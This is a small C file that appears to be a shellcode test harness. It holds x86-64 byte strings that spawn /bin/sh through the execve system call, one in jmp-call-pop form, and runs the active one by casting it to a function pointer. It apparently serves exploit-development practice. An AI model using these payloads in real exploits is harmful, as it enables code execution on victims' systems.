#include <stdio.h>


int main() {
	// char clean[] = "\x48\x31\xed\x48\x31\xe4\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
	// char shellcode[] = "\x48\x31\xd2\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
	char shellcode[] = "\xeb\x12\x48\x31\xf6\x48\x31\xd2\x48\x89\xcf\xb0\x3b\x0f\x05\xe8\xee\xff\xff\xff\xeb\xf9\x68\x73\x2f\x2f\x6e\x69\x62\x2f";
	
	// (*(void (*)()) clean)();
	(*(void (*)()) shellcode)();
	return 0;
}
